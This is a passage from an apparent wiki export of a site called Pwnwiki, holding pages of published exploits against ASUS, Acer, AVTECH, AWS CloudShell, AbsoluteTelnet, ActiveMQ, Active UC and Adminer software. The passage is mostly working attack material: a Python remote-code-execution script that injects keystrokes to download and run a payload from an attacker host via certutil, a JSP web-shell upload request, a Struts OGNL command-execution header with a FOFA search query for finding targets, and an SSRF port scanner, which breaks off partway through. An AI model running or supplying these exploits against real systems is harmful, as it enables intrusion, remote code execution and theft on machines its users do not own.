      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1814" sha1="tur4xb22at3tmz10ld967be452kffcc" xml:space="preserve">&lt;pre&gt;
# Exploit Title: ASUS DisplayWidget Software 3.4.0.036 - 'ASUSDisplayWidgetService' Unquoted Service Path
# Date: 2021-06-21
# Exploit Author: Julio Aviña
# Vendor Homepage: https://www.asus.com/
# Software Link: https://dlcdnets.asus.com/pub/ASUS/LCD%20Monitors/MB16ACE/ASUS_DisplayWidget_3.4.0.036.exe.zip
# Version: 3.4.0.036
# Service File Version 1.0.0.1
# Tested on: Windows 10 Pro x64 es 
# Vulnerability Type: Unquoted Service Path


# 1. To find the unquoted service path vulnerability

C:\&gt;wmic service where 'name like "%ASUSDisplayWidgetService%"' get displayname, pathname, startmode, startname

DisplayName                                      PathName                                                                        StartMode  StartName
ASUS DisplayWidget Service by Portrait Displays  C:\Program Files\Portrait Displays\ASUS DisplayWidget\DisplayWidgetService.exe  Auto       LocalSystem

# 2. To check service info:

C:\&gt;sc qc "ASUSDisplayWidgetService"
[SC] QueryServiceConfig CORRECTO

NOMBRE_SERVICIO: ASUSDisplayWidgetService
        TIPO               : 10  WIN32_OWN_PROCESS
        TIPO_INICIO        : 2   AUTO_START
        CONTROL_ERROR      : 1   NORMAL
        NOMBRE_RUTA_BINARIO: C:\Program Files\Portrait Displays\ASUS DisplayWidget\DisplayWidgetService.exe
        GRUPO_ORDEN_CARGA  :
        ETIQUETA           : 0
        NOMBRE_MOSTRAR     : ASUS DisplayWidget Service by Portrait Displays
        DEPENDENCIAS       :
        NOMBRE_INICIO_SERVICIO: LocalSystem


# 3. Exploit:

A successful attempt to exploit this vulnerability requires the attacker to insert an executable file into the service path undetected by the OS or some security application.
When restarting the service or the system, the inserted executable will run with elevated privileges.
&lt;/pre&gt;</text>
      <sha1>tur4xb22at3tmz10ld967be452kffcc</sha1>
    </revision>
  </page>
  <page>
    <title>ASUS HID Access Service 1.0.94.0 - 'AsHidSrv.exe' Unquoted Service Path</title>
    <ns>0</ns>
    <id>2517</id>
    <revision>
      <id>3010</id>
      <timestamp>2021-05-21T06:39:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: ASUS HID Access Service 1.0.94.0 - 'AsHidSrv.exe' Unquoted Service Path # Date: 2020-05-19 # Exploit Author: Alejandra Sánchez # Vendor Homepag..."</comment>
      <origin>3010</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1717" sha1="cczkeypcpe68nx1aettfsdoujjlzmca" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: ASUS HID Access Service 1.0.94.0 - 'AsHidSrv.exe' Unquoted Service Path
# Date: 2020-05-19
# Exploit Author: Alejandra Sánchez
# Vendor Homepage: www.asus.com
# Version: 1.0.94.0
# Tested on: Windows 10 Pro x64 es

# Description:
ATK Hotkey 1.0.94.0 suffers from an unquoted search path issue impacting the service 'AsHidService'. This could potentially allow an 
authorized but non-privileged local user to execute arbitrary code with elevated privileges on the system. A successful attempt would require 
the local user to be able to insert their code in the system root path undetected by the OS or other security applications where it could 
potentially be executed during application startup or reboot. If successful, the local user’s code would execute with the elevated privileges
of the application.

# Prerequisites
Local, Non-privileged Local User with restart capabilities

# Details

C:\&gt;wmic service get name, pathname, displayname, startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
ASUS HID Access Service               AsHidService               C:\Program Files (x86)\ASUS\ATK Package\ATK Hotkey\AsHidSrv.exe               Auto

C:\&gt;sc qc "AsHidService"
[SC] QueryServiceConfig CORRECTO

NOMBRE_SERVICIO: AsHidService
        TIPO               : 10  WIN32_OWN_PROCESS
        TIPO_INICIO        : 2   AUTO_START
        CONTROL_ERROR      : 1   NORMAL
        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\ASUS\ATK Package\ATK Hotkey\AsHidSrv.exe
        GRUPO_ORDEN_CARGA  :
        ETIQUETA           : 0
        NOMBRE_MOSTRAR     : ASUS HID Access Service
        DEPENDENCIAS       :
        NOMBRE_INICIO_SERVICIO: LocalSystem
&lt;/pre&gt;</text>
      <sha1>cczkeypcpe68nx1aettfsdoujjlzmca</sha1>
    </revision>
  </page>
  <page>
    <title>ASUS Remote Link 1.1.2.13 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1189</id>
    <revision>
      <id>1493</id>
      <timestamp>2021-04-11T01:01:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit: ASUS Remote Link 1.1.2.13 - Remote Code Execution # Date: 24-02-2021 # Exploit Author: H4rk3nz0 # Vendor Homepage: http://asus.com/ # Software Link: h..."</comment>
      <origin>1493</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7951" sha1="awfxcop6sfw4p83753vhtnt0z8qojnb" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit: ASUS Remote Link 1.1.2.13 - Remote Code Execution
# Date: 24-02-2021
# Exploit Author: H4rk3nz0
# Vendor Homepage: http://asus.com/
# Software Link: http://remotelink.asus.com/
# Version: 1.1.2.13
# Tested on: Windows 10 Enterprise Build 17763
# CVE: N/A

#!/usr/bin/python

import socket
from time import sleep
import sys


port = 5665
target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

prefix = "04020b02"
suffix = "0000020000000000000000000300000000000000000004000000000000000000010000"
enter = (prefix + ("0" * 1038)).decode("hex")
string_prefix = "04020b0200000000010000"
string_suffix = "0" * 1022
pre_command = "04000b0200000000".decode("hex")
user_declare = ("02028a0000000000000057696e646f777320446566656e646572" + "0" * 224).decode("hex") # Declares Connection Source as 'Windows Defender'

# ASCII to Hex Character List
characters={
	"A":"41","B":"42","C":"43","D":"44","E":"45","F":"46","G":"47","H":"48","I":"49","J":"4a","K":"4b","L":"4c","M":"4d","N":"4e",
	"O":"4f","P":"50","Q":"51","R":"52","S":"53","T":"54","U":"55","V":"56","W":"57","X":"58","Y":"59","Z":"5a",
	"a":"61","b":"62","c":"63","d":"64","e":"65","f":"66","g":"67","h":"68","i":"69","j":"6a","k":"6b","l":"6c","m":"6d","n":"6e",
	"o":"6f","p":"70","q":"71","r":"72","s":"73","t":"74","u":"75","v":"76","w":"77","x":"78","y":"79","z":"7a",
	"1":"31","2":"32","3":"33","4":"34","5":"35","6":"36","7":"37","8":"38","9":"39","0":"30",
	" ":"20","+":"2b","=":"3d","/":"2f","_":"5f","&lt;":"3c",
	"&gt;":"3e","[":"5b","]":"5d","!":"21","@":"40","#":"23","$":"24","%":"25","^":"5e","&amp;":"26","*":"2a",
	"(":"28",")":"29","-":"2d","'":"27",'"':"22",":":"3a",";":"3b","?":"3f","`":"60","~":"7e",
	"\\":"5c","|":"7c","{":"7b","}":"7d",",":"2c",".":"2e"}


# User Specified arguments
try:
	rhost = "192.168.1.93"
	lhost = sys.argv[2]
	payload = sys.argv[3]
except:
	print("Usage: python " + sys.argv[0] + " &lt;target-ip&gt; &lt;local-http-ip&gt; &lt;payload-name&gt;")
	exit()

# HandShake Packets to Smart Gesture Server
def Handshake():
	target.connect((rhost,port))
	target.sendto("b2".decode("hex"),(rhost,port))
	target.sendto("38323538".decode("hex"),(rhost,port))
	target.sendto("03000f0000000000".decode("hex"),(rhost,port))
	target.sendto("03020f000000000003310000000000".decode("hex"),(rhost,port))
	target.sendto("02008a0000000000".decode("hex"),(rhost,port))
	target.sendto(user_declare,(rhost,port))
	sleep(0.1)


def MoveMouse():
	for i in range(0,16):
		target.sendto("0000330038040006".decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101db010000c502" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101d0010000ca02" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101c7010000ce02" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101bd010000d202" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101b2010000d502" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101a6010000d802" + suffix).decode("hex"),(rhost,port))
		target.sendto(("0001330038040006010199010000db02" + suffix).decode("hex"),(rhost,port))
		target.sendto(("000133003804000601018d010000de02" + suffix).decode("hex"),(rhost,port))
		target.sendto(("0001330038040006010180010000e002" + suffix).decode("hex"),(rhost,port))
		target.sendto(("0001330038040006010171010000e402" + suffix).decode("hex"),(rhost,port))
		target.sendto(("0001330038040006010163010000e602" + suffix).decode("hex"),(rhost,port))
		target.sendto(("0001330038040006010154010000e902" + suffix).decode("hex"),(rhost,port))
		target.sendto(("0001330038040006010146010000eb02" + suffix).decode("hex"),(rhost,port))
		target.sendto(("000133003804000601013b010000ed02" + suffix).decode("hex"),(rhost,port))
		target.sendto(("000133003804000601012d010000f002" + suffix).decode("hex"),(rhost,port))
		target.sendto(("0001330038040006010120010000f302" + suffix).decode("hex"),(rhost,port))
		target.sendto(("0001330038040006010113010000f702" + suffix).decode("hex"),(rhost,port))
		target.sendto(("0001330038040006010107010000fa02" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101fa000000fd02" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101f10000000003" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101e50000000303" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101d90000000603" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101ce0000000903" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101c20000000d03" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101b60000001103" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101ab0000001403" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101a00000001803" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101950000001c03" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101890000002003" + suffix).decode("hex"),(rhost,port))
		target.sendto(("000133003804000601017e0000002403" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101740000002703" + suffix).decode("hex"),(rhost,port))
		target.sendto(("000133003804000601016c0000002a03" + suffix).decode("hex"),(rhost,port))
		target.sendto(("00013300380400060101650000002c03" + suffix).decode("hex"),(rhost,port))
		target.sendto(("000133003804000601015c0000002f03" + suffix).decode("hex"),(rhost,port))
		target.sendto(("000133003804000601015c0000003003" + suffix).decode("hex"),(rhost,port))
		target.sendto(("000233003804000601005c0000003003" + suffix).decode("hex"),(rhost,port))
		sleep(0.6)

# Sends Left Click Input (Occasional Delay for some Reason)
def LeftClick():
	target.sendto("0000330038040006".decode("hex"),(rhost,port))
	target.sendto(("0001330038040006010116020000e502" + suffix).decode("hex"),(rhost,port))
	target.sendto(("0001330038040006010116020000e502" + suffix).decode("hex"),(rhost,port))
	target.sendto(("0001330038040006010116020000e502" + suffix).decode("hex"),(rhost,port))
	target.sendto(("0001330038040006010116020000e502" + suffix).decode("hex"),(rhost,port))
	target.sendto(("0001330038040006010116020000e502" + suffix).decode("hex"),(rhost,port))
	target.sendto(("0001330038040006010116020000e502" + suffix).decode("hex"),(rhost,port))
	target.sendto(("0001330038040006010116020000e502" + suffix).decode("hex"),(rhost,port))
	target.sendto(("0001330038040006010116020000e502" + suffix).decode("hex"),(rhost,port))
	target.sendto(("0002330038040006010016020000e502" + suffix).decode("hex"),(rhost,port))
	sleep(4)

# Send Enter/Return Key Input
def SendReturn():
	target.sendto(pre_command,(rhost,port))
	sleep(0.2)
	target.sendto(enter,(rhost,port)) # Enter/Return Key

# Send String Characters
def SendString(string):
	for char in string:
		convert = characters[char]
		final_string = string_prefix + convert + string_suffix
		target.sendto(pre_command,(rhost,port))
		target.sendto(final_string.decode("hex"),(rhost,port))
		sleep(0.2)

# Main Execution
def main():
	print("[+] Saying Hello")
	Handshake()
	sleep(2)
	print("[+] Moving Mouse")
	MoveMouse()
	print("[+] Left Clicking (takes a few seconds)")
	LeftClick() # Left Click is delayed sometimes
	print("[+] Opening CMD")
	SendString("cmd.exe") # Start Command Prompt
	sleep(0.5)
	SendReturn()
	sleep(1)
	print("[+] Retrieving Payload")
	SendString("certutil.exe -f -urlcache http://" + lhost + "/" + payload + " C:\\Windows\Temp\\" + payload) # Retrieve Payload
	sleep(0.5)
	SendReturn()
	sleep(3)
	print("[+] Executing")
	SendString("C:\\Windows\\Temp\\" + payload) # Execute Payload
	sleep(0.5)
	SendReturn()
	sleep(0.5)
	print("[+] Done! Check your listener?")
	SendReturn() # Trailing Enter Command Ensures full execution
	target.close()
	exit()

if __name__=="__main__":
	main()
&lt;/pre&gt;</text>
      <sha1>awfxcop6sfw4p83753vhtnt0z8qojnb</sha1>
    </revision>
  </page>
  <page>
    <title>AVTECH 未授權信息洩露漏洞</title>
    <ns>0</ns>
    <id>2252</id>
    <revision>
      <id>2682</id>
      <timestamp>2021-05-06T08:59:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Payload== &lt;pre&gt; POST /cgi-bin/supervisor/adcommand.cgi HTTP/1.1  User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0  Accept: text/html,appl..."</comment>
      <origin>2682</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="407" sha1="51k3snx5ineydv5r317vuya1b0znen4" xml:space="preserve">==Payload==
&lt;pre&gt;
POST /cgi-bin/supervisor/adcommand.cgi HTTP/1.1

User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0

Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Connection: close

Upgrade-Insecure-Requests: 1

Content-Type: application/x-www-form-urlencoded

Content-Length: 23

DoShellCmd "strCmd=expr
&lt;/pre&gt;</text>
      <sha1>51k3snx5ineydv5r317vuya1b0znen4</sha1>
    </revision>
  </page>
  <page>
    <title>AWS CloudShell 終端逃逸注入&amp;遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>3109</id>
    <revision>
      <id>3612</id>
      <timestamp>2021-05-30T02:13:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; Terminal escape injection in AWS CloudShell  The javascript terminal emulator used by AWS CloudShell handles certain terminal escape codes incorrectly. This can..."</comment>
      <origin>3612</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2455" sha1="4kldeezdb3fcef9iuvot6zjijaxje36" xml:space="preserve">==EXP==
&lt;pre&gt;
Terminal escape injection in AWS CloudShell

The javascript terminal emulator used by AWS CloudShell handles certain terminal escape
codes incorrectly. This can lead to remote code execution if attacker controlled data is
displayed in a CloudShell instance.

The bug is in the handling of DCS escape codes by the aceterm library:
//https://github.com/c9/core/blob/master/plugins/c9.ide.terminal/aceterm/libterm.js#L1276
// Request Termcap/Terminfo String (xterm, experimental)
// Regular xterm does not even respond to this sequence.
// This can cause a small glitch in vim.
// test: echo -ne '\\eP+q6b64\\e\\\\'
case '+q':
  var pt = this.currentParam
    , valid = false;

   this.send('\\x1bP' + +valid + '+r' + pt + '\\x1b\\\\');
   break;


this.currentParam contains the arbitrary substring that follows the \"\\eP+q\" escape code.
this.send() passes its argument to the terminal input handler. This can be used to
execute arbitrary commands by putting a multiline string into this.currentParam.

It's trivial to trigger the bug using echo, printing the string '\\eP+q\
whoami\
\\e\\\\',
will trigger execution of the whoami command:

[cloudshell-user@ip-10-0-163-85 ~]$ echo -ne '\\eP+q\
whoami\
\\e\\\\'
[cloudshell-user@ip-10-0-163-85 ~]$
[cloudshell-user@ip-10-0-163-85 ~]$ whoami
cloudshell-user
[cloudshell-user@ip-10-0-163-85 ~]$


A potential attack scenario would be to trick someone into accessing a malicious web
service using a tool like curl:

attacker:
- echo -e \"echo -ne \"abcdef\\x1bP+q\
touch /tmp/foo\
\\x1b\
\"\" &gt; index.html

victim: (using AWS CloudShell)
- curl http://evil.com/index.html

This will create the file /tmp/foo on the victim machine.

If AWS CloudShell is used to ssh into (potentially compromised) EC2 VMs or to view log
files that contain attacker controlled payloads, similar attacks are possible.

As CloudShell has full access to the credentials used for the management console login,
exploiting this vulnerability can give an attacker a very powerful entry point to an AWS
environment.

This bug is subject to a 90 day disclosure deadline. After 90 days elapse, the bug report
will become visible to the public. The scheduled disclosure date is 2021-05-09.
Disclosure at an earlier date is also possible if agreed upon by all parties.

Please credit Felix Wilhelm of Google Project Zero in all releases, patches and
advisories related to this issue.




Found by: fwilhelm@google.com

&lt;/pre&gt;</text>
      <sha1>4kldeezdb3fcef9iuvot6zjijaxje36</sha1>
    </revision>
  </page>
  <page>
    <title>AbsoluteTelnet 10.16 - 'License name' 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>1610</id>
    <revision>
      <id>2014</id>
      <timestamp>2021-05-02T04:34:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; #Exploit Title: AbsoluteTelnet 10.16 - 'License name' Denial of Service (PoC) #Discovery by: Victor Mondragón #Discovery Date: 2019-05-19 #Vendor Homepage: http..."</comment>
      <origin>2014</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="702" sha1="d4msvyd3qs1irmcza58j85iaic1p8wi" xml:space="preserve">==POC==
&lt;pre&gt;
#Exploit Title: AbsoluteTelnet 10.16 - 'License name' Denial of Service (PoC)
#Discovery by: Victor Mondragón
#Discovery Date: 2019-05-19
#Vendor Homepage: https://www.celestialsoftware.net/
#Software Link: https://www.celestialsoftware.net/telnet/AbsoluteTelnet10.16.exe
#Tested Version: 10.16
#Tested on: Windows 7 Service Pack 1 x64

#Steps to produce the crash:
#1.- Run python code: AbsoluteTelent.py
#2.- Open AbsoluteTelent.txt and copy content to clipboard
#3.- Open AbsoluteTelnet.exe
#4.- Select "Help" &gt; "Enter License Key"
#5.- In "License Name" paste Clipboard
#6.- Crashed

cod = "\x41" * 2500

f = open('AbsoluteTelent.txt', 'w')
f.write(cod)
f.close()
            
&lt;/pre&gt;</text>
      <sha1>d4msvyd3qs1irmcza58j85iaic1p8wi</sha1>
    </revision>
  </page>
  <page>
    <title>Acer Updater Service 1.2.3500.0 - 'UpdaterService.exe' Unquoted Service Path</title>
    <ns>0</ns>
    <id>2515</id>
    <revision>
      <id>3008</id>
      <timestamp>2021-05-21T06:36:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Acer Updater Service 1.2.3500.0 - 'UpdaterService.exe'  Unquoted Service Path # Discovery by: Emmanuel Lujan # Discovery Date: 2020-11-26 # Vend..."</comment>
      <origin>3008</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1652" sha1="tukwfk3ugog2eqyvhm2h4va513twh4p" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Acer Updater Service 1.2.3500.0 - 'UpdaterService.exe'  Unquoted Service Path
# Discovery by: Emmanuel Lujan
# Discovery Date: 2020-11-26
# Vendor Homepage: https://www.acer.com/ac/en/US/content/home
# Tested Version: 1.2.3500.0
# Vulnerability Type: Unquoted Service Path
# Tested on OS: Windows 7 Home Premium x64 

# Step to discover Unquoted Service Path: 

C:\&gt;wmic service get name, pathname, displayname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

Live Updater Service                                                    Live Upd
ater Service                          C:\Program Files\Acer\Acer Updater\Updater
Service.exe                                               Auto

# Service info:

C:\&gt;sc qc "Live Updater Service"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Live updater Service
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START  
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Acer\Acer Updater\UpdaterService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Live Updater Service
        DEPENDENCIES       :                            
        SERVICE_START_NAME : LocalSystem

#Exploit:

A successful attempt would require the local user to be able to insert their code in the system root path undetected by the OS or other
 security applications where it could potentially be executed during application startup or reboot. If successful, the local user's 
code would execute with the elevated privileges of the application.
&lt;/pre&gt;</text>
      <sha1>tukwfk3ugog2eqyvhm2h4va513twh4p</sha1>
    </revision>
  </page>
  <page>
    <title>ActiveMQ 任意文件上傳漏洞</title>
    <ns>0</ns>
    <id>1066</id>
    <revision>
      <id>1345</id>
      <timestamp>2021-04-10T01:53:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; PUT /fileserver/2.jsp HTTP/1.1 Host: 192.168.177.137:8161 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0 Accept: text/html..."</comment>
      <origin>1345</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="792" sha1="8ytg6wlf2xui6sx1s6t723ebv676uw4" xml:space="preserve">==POC==
&lt;pre&gt;
PUT /fileserver/2.jsp HTTP/1.1
Host: 192.168.177.137:8161
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: JSESSIONID=18wws8yzr1a04iz9gfpkkar3p
Authorization: Basic YWRtaW46YWRtaW4=
X-Forwarded-For: 8.8.8.8
Connection: close
Content-Length: 329

&lt;%@ page import="java.io.*"%&gt;
&lt;%
 out.print("Hello&lt;/br&gt;");
 String strcmd=request.getParameter("cmd");
 String line=null;
 Process p=Runtime.getRuntime().exec(strcmd);
 BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
 while((line=br.readLine())!=null){
 out.print(line+"&lt;/br&gt;");
 }
%&gt;
&lt;/pre&gt;</text>
      <sha1>8ytg6wlf2xui6sx1s6t723ebv676uw4</sha1>
    </revision>
  </page>
  <page>
    <title>Active UC index.action 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>5231</id>
    <revision>
      <id>5987</id>
      <timestamp>2021-06-27T07:40:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt;  &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; Active UC  ==FOFA== &lt;pre&gt; title="网动统一通信平台(Active UC)" &lt;/pre&gt;  ==POC== &lt;pre&gt; POST /acenter/index.action..."</comment>
      <origin>5987</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1544" sha1="ntnlr1nnil57uvp93fflmqi8ptbfjfp" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
Active UC

==FOFA==
&lt;pre&gt;
title="网动统一通信平台(Active UC)"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
POST /acenter/index.action HTTP/1.1
Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Charsert: UTF-8
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170
Cache-Control: no-cache
Pragma: no-cache
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
Content-Length: 196
-----------------------------18012721719170
Content-Disposition: form-data; name="pocfile"; filename="text.txt"
Content-Type: text/plain
xxxxxxx
-----------------------------18012721719170
&lt;/pre&gt;</text>
      <sha1>ntnlr1nnil57uvp93fflmqi8ptbfjfp</sha1>
    </revision>
    <revision>
      <id>5988</id>
      <parentid>5987</parentid>
      <timestamp>2021-06-27T07:40:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5988</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1555" sha1="ph8qekhswy966i7xldgxkueb8dt8xhr" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
Active UC

==FOFA==
&lt;pre&gt;
title="网动统一通信平台(Active UC)"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
POST /acenter/index.action HTTP/1.1
Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Charsert: UTF-8
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170
Cache-Control: no-cache
Pragma: no-cache
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
Content-Length: 196
-----------------------------18012721719170
Content-Disposition: form-data; name="pocfile"; filename="text.txt"
Content-Type: text/plain
xxxxxxx
-----------------------------18012721719170
&lt;/pre&gt;</text>
      <sha1>ph8qekhswy966i7xldgxkueb8dt8xhr</sha1>
    </revision>
  </page>
  <page>
    <title>Adminer 服務器端請求偽造漏洞</title>
    <ns>0</ns>
    <id>1335</id>
    <revision>
      <id>1675</id>
      <timestamp>2021-04-15T05:38:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響== Adminer&lt;=4.3.1   ==POC== &lt;pre&gt; import socket,re,ssl,warnings,subprocess,time from platform import system as system_name  from os import system as system_call..."</comment>
      <origin>1675</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10937" sha1="onqrx5yx7c9m32evxfzaax10kong2vi" xml:space="preserve">==漏洞影響==
Adminer&lt;=4.3.1


==POC==
&lt;pre&gt;
import socket,re,ssl,warnings,subprocess,time
from platform import system as system_name 
from os import system as system_call

#Adminer Server Side Request Forgery
#PortMiner Scanner Tool
#by John Page (hyp3rlinx)
#ISR: ApparitionSec
#hyp3rlinx.altervista.org 
#=========================
#D1rty0Tis says hi.

#timeout
MAX_TIME=32
#ports to log
port_lst=[]  
#Web server response often times out but usually means ports open.
false_pos_ports=['80','443'] 

BANNER='''
           ____            _   __  __ _                  
          |  _  \         | | |  \/  (_)                 
          | |__) |__  _ __| |_| \  / |_ _ __   ___ _ __  
          |  ___/ _ \| '__| __| |\/| | | '_ \ / _ \ '__| 
          | |  | (_) | |  | |_| |  | | | | | |  __/ |    
          |_|   \___/|_|   \__|_|  |_|_|_| |_|\___|_|                                                                                                             
       '''                               
   

def info():
    print "\nPortMiner depends on Error messages to determine open/closed ports."
    print "Read operations reported 'timed out' may be open/filtered.\n"


def greet():
    print 'Adminer Unauthenticated SSRF Port Scanner Tool'
    print 'Targets Adminer used for MySQL administration\n'
    print 'by hyp3rlinx - apparition security'
    print '-----------------------------------------------------\n'
    print 'Scan small ranges or single ports or expect to wait.\n'
    print 'Do not scan networks without authorized permission.'
    print 'Author not responsible for abuse/misuse.\n'

    
def chk_ports(p): 
    p=p.replace('-',',')
    port_arg=p.split(',')
    try:
        if len(port_arg)&gt;1:
            if int(port_arg[1]) &lt; int(port_arg[0]):
                print 'Port range not valid.'
                raw_input()
                return
            if int(port_arg[1])&gt;65535:
                print 'Exceeded max Port range 65535.'
                raw_input()
                return
    except Exception as e:
        print str(e)
        return None
    return list(range(int(port_arg[0]),int(port_arg[1])+1))



def log(IP):
    try:
        file=open('PortMiner.txt', 'w')
        file.write(IP+'\n')
        for p in port_lst:
            file.write(p+'\n')
        file.close()
    except Exception as e:
        print str(e)
    print "\nSee PortMiner.txt"


def use_ssl(ADMINER,ADMINER_PORT):
    try:
